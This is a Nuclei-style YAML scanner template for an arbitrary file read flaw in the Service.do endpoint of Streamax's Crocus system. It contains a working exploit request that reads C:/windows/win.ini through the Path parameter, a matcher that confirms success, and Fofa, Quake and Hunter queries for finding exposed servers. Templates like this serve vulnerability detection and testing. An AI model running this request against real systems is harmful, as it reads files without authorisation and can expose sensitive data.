id: Streamax_Crocus_Fileread

info:
  name: Streamax_Crocus_Fileread
  author: HK
  severity: medium
  description: 锐明技术Crocus系统Service.do接口Path参数存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/ThirdResource/respond/respond.min.js"
    Quake-query: body="/ThirdResource/respond/respond.min.js"
    Hunter-query: body="/ThirdResource/respond/respond.min.js"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Connection: close


  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - extensions